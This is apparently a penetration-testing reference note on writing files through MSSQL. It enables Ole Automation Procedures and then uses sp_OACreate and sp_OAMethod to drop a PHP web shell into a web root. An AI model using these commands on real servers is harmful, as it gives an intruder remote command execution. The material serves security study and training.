---
tags:
  - Enumeration
  - TCP
  - MSSQL
  - Concepts
---
See [[2. Enumeration/TCP/3306. MySQL (SQL)/Concepts/Write Local File|Write Local File]] from [[2. Enumeration/TCP/3306. MySQL (SQL)/1. Guide|MySQL]] for more information.
## Restrictions

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
#### Enable Ole Automation Procedures

```cmd-session
sp_configure 'show advanced options', 1
```
```cmd-session
RECONFIGURE
```
```cmd-session
sp_configure 'Ole Automation Procedures', 1
```
```cmd-session
RECONFIGURE
```


## Usage

Using [[SqlCmd]]:

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```